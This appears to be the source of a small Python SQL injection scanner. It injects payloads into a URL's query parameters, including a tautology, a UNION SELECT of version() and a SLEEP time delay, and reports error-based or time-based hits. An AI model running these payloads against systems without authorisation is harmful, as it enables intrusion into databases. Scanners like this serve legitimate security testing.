import requests
from urllib.parse import urlparse, parse_qs
from colorama import Fore, Style
import time

class SQLiScanner:
    def __init__(self):
        self.session = requests.Session()
        self.payloads = [
            "'", 
            '"',
            "' OR '1'='1",
            "' UNION SELECT null,version(),3-- -",
            "' OR SLEEP(5)-- -"
        ]

    def scan(self, url, verbose=False, output_file=None):
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            for param, values in params.items():
                for payload in self.payloads:
                    try:
                        test_url = self._build_test_url(parsed, param, payload)
                        
                        # Time-based detection
                        start_time = time.time()
                        self.session.get(test_url)
                        elapsed = time.time() - start_time
                        
                        # Error-based detection
                        res = self.session.get(test_url)
                        if self._is_sqli_error(res.text):
                            self._log_vulnerability(
                                f"SQLi in {param} (Error-based)",
                                test_url,
                                payload,
                                output_file
                            )
                        elif 'SLEEP' in payload and elapsed >= 5:
                            self._log_vulnerability(
                                f"SQLi in {param} (Time-based)",
                                test_url,
                                payload,
                                output_file
                            )
                    except Exception as e:
                        if verbose:
                            print(f"{Fore.RED}[!] Test failed: {e}{Style.RESET_ALL}")
        except Exception as e:
            if verbose:
                print(f"{Fore.RED}[!] URL parsing error: {e}{Style.RESET_ALL}")

    def _build_test_url(self, parsed, param, payload):
        params = parse_qs(parsed.query)
        params[param] = [payload]
        return parsed._replace(query="&".join(f"{k}={v[0]}" for k,v in params.items())).geturl()

    def _is_sqli_error(self, response_text):
        errors = [
            'SQL syntax',
            'MySQL',
            'PostgreSQL',
            'ORA-',
            'unclosed quotation'
        ]
        return any(error in response_text for error in errors)

    def _log_vulnerability(self, title, url, payload, output_file):
        msg = f"{Fore.GREEN}[+] {title}{Style.RESET_ALL}\nURL: {url}\nPayload: {payload}\n"
        print(msg)
        
        if output_file:
            with open(output_file, 'a') as f:
                f.write(msg + "\n")
